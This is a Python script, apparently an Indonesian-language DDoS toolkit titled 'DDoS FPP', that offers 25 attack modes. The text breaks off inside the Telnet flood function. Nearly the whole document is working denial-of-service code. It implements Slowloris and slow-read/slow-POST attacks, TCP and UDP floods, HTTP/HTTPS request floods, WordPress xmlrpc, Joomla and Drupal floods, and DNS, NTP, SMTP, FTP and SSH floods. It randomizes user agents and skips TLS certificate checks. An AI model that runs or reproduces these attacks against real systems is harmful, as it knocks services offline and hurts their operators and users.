#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ========== WARNA ==========
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
BLINK = '\033[5m'
RESET = '\033[0m'

b = fr"""
{RED}{BOLD}
>====>     >====>                  >=>>=>   >=======> >======>   
>=>   >=>  >=>   >=>             >=>    >=> >=>       >=>    >=> 
>=>    >=> >=>    >=>    >=>      >=>       >=>       >=>    >=> 
>=>    >=> >=>    >=>  >=>  >=>     >=>     >=====>   >======>   
>=>    >=> >=>    >=> >=>    >=>       >=>  >=>       >=>        
>=>   >=>  >=>   >=>   >=>  >=>  >=>    >=> >=>       >=>        
>====>     >====>        >=>       >=>>=>   >=>       >=>        
                                                                 
{RESET}{GREEN}

                     FULL PACK EDITION - NO ROOT
                     Created by: YKAZZZ
                     Version: 0.1.0-BETA
"""

import json
import os
import sys
import socket
import threading
import time
import random
import ssl
import ipaddress
import getpass
from datetime import datetime, timedelta

os.system("clear")
print(b)
time.sleep(2)
os.system("clear")
# ========== SLOW PRINT ==========
def slow_print(text, delay=0.0001):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# ========== BANNER ==========
def show_banner():
    banner = f"""
{RED}{BOLD}
>====>     >====>                  >=>>=>   >=======> >======>   
>=>   >=>  >=>   >=>             >=>    >=> >=>       >=>    >=> 
>=>    >=> >=>    >=>    >=>      >=>       >=>       >=>    >=> 
>=>    >=> >=>    >=>  >=>  >=>     >=>     >=====>   >======>   
>=>    >=> >=>    >=> >=>    >=>       >=>  >=>       >=>        
>=>   >=>  >=>   >=>   >=>  >=>  >=>    >=> >=>       >=>        
>====>     >====>        >=>       >=>>=>   >=>       >=>        
                                                                 

{RESET}
"""
    print(banner)

# ========== USER-AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]

# ========== MODE DESKRIPSI ==========
MODES = {
    # Low & Slow
    '1': {'name': 'slowloris', 'desc': 'Slowloris - Ninja Mode', 'cat': 'Low & Slow'},
    '2': {'name': 'slowread', 'desc': 'Slowread - RAM Eater', 'cat': 'Low & Slow'},
    '3': {'name': 'slowpost', 'desc': 'Slowpost - Connection Killer', 'cat': 'Low & Slow'},
    '4': {'name': '404', 'desc': '404 Flood - Log Flooder', 'cat': 'Low & Slow'},
    # Protocol
    '5': {'name': 'tcpflood', 'desc': 'TCP Flood', 'cat': 'Protocol'},
    '6': {'name': 'udpflood', 'desc': 'UDP Flood', 'cat': 'Protocol'},
    # Web
    '7': {'name': 'httpflood', 'desc': 'HTTP Flood', 'cat': 'Web'},
    '8': {'name': 'httpsflood', 'desc': 'HTTPS Flood', 'cat': 'Web'},
    '9': {'name': 'getflood', 'desc': 'GET Flood', 'cat': 'Web'},
    '10': {'name': 'postflood', 'desc': 'POST Flood', 'cat': 'Web'},
    '11': {'name': 'headflood', 'desc': 'HEAD Flood', 'cat': 'Web'},
    # CMS
    '12': {'name': 'wpflood', 'desc': 'WordPress Flood', 'cat': 'CMS'},
    '13': {'name': 'joomlaflood', 'desc': 'Joomla Flood', 'cat': 'CMS'},
    '14': {'name': 'drupalflood', 'desc': 'Drupal Flood', 'cat': 'CMS'},
    '15': {'name': 'phpflood', 'desc': 'PHP Flood', 'cat': 'CMS'},
    # App Layer
    '16': {'name': 'dnsflood', 'desc': 'DNS Flood', 'cat': 'Application'},
    '17': {'name': 'ntpflood', 'desc': 'NTP Flood', 'cat': 'Application'},
    '18': {'name': 'smtpflood', 'desc': 'SMTP Flood', 'cat': 'Application'},
    '19': {'name': 'ftpflood', 'desc': 'FTP Flood', 'cat': 'Application'},
    '20': {'name': 'sshflood', 'desc': 'SSH Flood', 'cat': 'Application'},
    '21': {'name': 'telnetflood', 'desc': 'Telnet Flood', 'cat': 'Application'},
    # Special
    '22': {'name': 'random', 'desc': 'Random Mode - Pilih mode acak', 'cat': 'SPECIAL'},
    '23': {'name': 'chaos', 'desc': 'Chaos Mode - Ganti mode tiap 30 detik', 'cat': 'SPECIAL'},
    '24': {'name': 'combo', 'desc': 'Combo Mode - Kombinasi 3 mode sekaligus', 'cat': 'SPECIAL'},
    '25': {'name': 'idiot', 'desc': 'Idiot Mode - Jalanin SEMUA mode bergantian', 'cat': 'SPECIAL'},
}

# ========== ATTACK CLASSES ==========
class RTAAttacks:
    @staticmethod
    def slowloris(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)

            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            headers = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Connection: keep-alive\r\n"
                f"Keep-Alive: timeout=30, max=100\r\n\r\n"
            )

            s.send(headers.encode('utf-8'))
            return s
        except Exception:
            return None

    @staticmethod
    def slowread(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)

            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            files = ['/index.html', '/style.css', '/script.js', '/file_besar.dat']
            path = random.choice(files)

            headers = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )

            s.send(headers.encode('utf-8'))
            return s
        except Exception:
            return None

    @staticmethod
    def slowpost(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)

            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            content_length = random.randint(100000, 500000)
            headers = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Content-Length: {content_length}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )

            s.send(headers.encode('utf-8'))
            s.send(b"data=")
            return s
        except Exception:
            return None

    @staticmethod
    def fourzerofour(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)

            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            names = ['bebek', 'ayam', 'kucing', 'ikan', 'burung', 'sapi']
            exts = ['.dat', '.jpg', '.png', '.zip', '.rar']
            fake_file = f"/{random.choice(names)}_{random.randint(1000,9999)}{random.choice(exts)}"

            headers = (
                f"GET {fake_file} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: close\r\n\r\n"
            )

            s.send(headers.encode('utf-8'))
            return s
        except Exception:
            return None

    @staticmethod
    def maintain(s, mode):
        try:
            if mode == 'slowloris':
                s.send(f"X-{random.randint(1000,9999)}: {random.randint(1,9999)}\r\n".encode('utf-8'))
            elif mode in ['slowread', '404']:
                s.recv(1)
            elif mode == 'slowpost':
                s.send(b"x")
            return True
        except Exception:
            return False


class YHCAttacks:
    @staticmethod
    def tcpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.close()
            return 1
        except Exception:
            return 0

    @staticmethod
    def udpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(random.randint(64, 1024))
            s.sendto(data, (target, port))
            return 1
        except Exception:
            return 0


class WebAttacks:
    @staticmethod
    def httpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            paths = ['/', '/index.html', '/about', '/contact', '/products']
            request = (
                f"GET {random.choice(paths)} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(request.encode('utf-8'))
            s.close()
            return 1
        except Exception:
            return 0

    @staticmethod
    def httpsflood(target, port, use_ssl=False):
        return WebAttacks.httpflood(target, port, True)

    @staticmethod
    def getflood(target, port, use_ssl=False):
        return WebAttacks.httpflood(target, port, use_ssl)

    @staticmethod
    def postflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            data = f"data={random.randint(1000,9999)}&submit=1"
            request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(data)}\r\n"
                f"Connection: close\r\n\r\n{data}"
            )
            s.send(request.encode('utf-8'))
            s.close()
            return 1
        except Exception:
            return 0

    @staticmethod
    def headflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            request = (
                f"HEAD / HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(request.encode('utf-8'))
            s.close()
            return 1
        except Exception:
            return 0


class CMSAttacks:
    @staticmethod
    def wpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            xml = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
            request = (
                f"POST /xmlrpc.php HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Content-Type: text/xml\r\n"
                f"Content-Length: {len(xml)}\r\n"
                f"Connection: close\r\n\r\n{xml}"
            )
            s.send(request.encode('utf-8'))
            s.close()
            return 1
        except Exception:
            return 0

    @staticmethod
    def joomlaflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            options = ['com_users', 'com_content', 'com_admin', 'com_cache']
            request = (
                f"GET /index.php?option={random.choice(options)} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(request.encode('utf-8'))
            s.close()
            return 1
        except Exception:
            return 0

    @staticmethod
    def drupalflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            nodes = [f"node/{random.randint(1,1000)}", f"user/{random.randint(1,100)}"]
            request = (
                f"GET /{random.choice(nodes)} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(request.encode('utf-8'))
            s.close()
            return 1
        except Exception:
            return 0

    @staticmethod
    def phpflood(target, port, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)

            php_files = ['index.php', 'config.php', 'wp-config.php', 'login.php', 'admin.php']
            request = (
                f"GET /{random.choice(php_files)} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(request.encode('utf-8'))
            s.close()
            return 1
        except Exception:
            return 0


class AppLayerAttacks:
    @staticmethod
    def dnsflood(target, port=53, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            domains = ['google.com', 'facebook.com', 'youtube.com', 'yahoo.com', 'amazon.com']
            domain = random.choice(domains)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            qname = b''
            for part in domain.split('.'):
                qname += bytes([len(part)]) + part.encode()
            qname += b'\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            query = transaction_id + flags + questions + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' + qname + qtype + qclass
            s.sendto(query, (target, port))
            return 1
        except Exception:
            return 0

    @staticmethod
    def ntpflood(target, port=123, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            payload = b'\x1b' + 47 * b'\0'
            s.sendto(payload, (target, port))
            return 1
        except Exception:
            return 0

    @staticmethod
    def smtpflood(target, port=25, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            commands = [
                "HELO example.com\r\n",
                "MAIL FROM: <test@example.com>\r\n",
                "RCPT TO: <target@example.com>\r\n",
                "QUIT\r\n"
            ]
            for cmd in commands[:random.randint(1,3)]:
                try:
                    s.send(cmd.encode())
                    time.sleep(0.1)
                except:
                    break
            s.close()
            return 1
        except Exception:
            return 0

    @staticmethod
    def ftpflood(target, port=21, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            commands = [
                "USER anonymous\r\n",
                "PASS anonymous@\r\n",
                "QUIT\r\n"
            ]
            for cmd in commands[:random.randint(1,2)]:
                try:
                    s.send(cmd.encode())
                    time.sleep(0.1)
                except:
                    break
            s.close()
            return 1
        except Exception:
            return 0

    @staticmethod
    def sshflood(target, port=22, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            ssh_versions = ["SSH-2.0-OpenSSH_8.2\r\n", "SSH-2.0-OpenSSH_7.9\r\n"]
            s.send(random.choice(ssh_versions).encode())
            try:
                s.recv(1024)
            except:
                pass
            s.close()
            return 1
        except Exception:
            return 0

    @staticmethod
    def telnetflood(target, port=23, use_ssl=False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            s.send(b'\xff\xfd\x22')
            try:
                s.recv(1024)
            except:
                pass
            s.close()
  